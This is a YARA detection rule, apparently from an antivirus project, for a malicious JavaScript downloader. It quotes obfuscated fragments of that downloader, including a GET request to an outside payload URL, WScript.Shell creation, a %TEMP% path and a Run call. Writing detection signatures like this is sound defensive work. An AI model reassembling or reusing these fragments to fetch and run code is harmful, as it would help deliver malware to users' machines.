rule sig_20160427_45b47400e42028e3ef5f4f68783dfe37 {
  meta:
    description = "datamaliciousorder - file 20160427_45b47400e42028e3ef5f4f68783dfe37.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "4f02717150f420d921ab2e64b63537dfbe6d1c415de83a673fcbc59eb7624579"

  strings:
    $s1  = "HzbtfAiden[OimrlYufun](\"G\" + \"ET\", \"http://aaacollectionsjewelry.com/ur8fgs\", false);" fullword ascii
    $s2  = "function ScmggOpysg() {return CwfjbKbnqp[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"Xlw6L38" ascii
    $s3  = "function ScmggOpysg() {return CwfjbKbnqp[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"Xlw6L38" ascii
    $s4  = "var CwfjbKbnqp = function EilmbWcvix() {return UleprKpdbx[OyfzsNzdzv](\"WScript\"+\".Shell\");}(), WmkdrOvldx = 11;" fullword ascii
    $s5  = "function DehqpCfbvo(WynzrAqumv, HktbpSxvuc){OpwntMlpwp = OpwntMlpwp * 1; return WynzrAqumv - HktbpSxvuc;};" fullword ascii
    $s6  = "var UleprKpdbx = this[\"WScript\"];" fullword ascii
    $s7  = "function YlgllTbvdg(){return DjwltGhtxd + \"\";};" fullword ascii
    $s8  = "if (HzbtfAiden[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function WajotQtwdz() {return ((SqssmHyaug == true) && (SqssmHyaug == NkexpAlnur)) ? 1 : OpwntMlpwp;};" fullword ascii
    $s10 = "SqssmHyaug = true; " fullword ascii
    $s11 = "var YkgcoPnobu = new this[\"D\"+\"ate\"]();" fullword ascii
    $s12 = "var SqssmHyaug = false;" fullword ascii
    $s13 = "function ObdmwYidei()" fullword ascii
    $s14 = "function CjepwJjqkh(PcddbNdjlr){CwfjbKbnqp[\"R\"+\"un\"](PcddbNdjlr, OpwntMlpwp, OpwntMlpwp);};" fullword ascii
    $s15 = "function NltpmUzhvx(){return 23;};" fullword ascii
    $s16 = "YwppgQmroo = true;" fullword ascii
    $s17 = "return DehqpCfbvo(QhhejHmoyz, FlbepIgpkf);" fullword ascii
    $s18 = "function VqjkoQchfd(ZdzeeAqhtc) {var FkeivGndlz = (1, 2, 3, 4, 5, ZdzeeAqhtc); return FkeivGndlz;};" fullword ascii
    $s19 = "}while (WrxnmOojdm);" fullword ascii
    $s20 = "NkexpAlnur = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}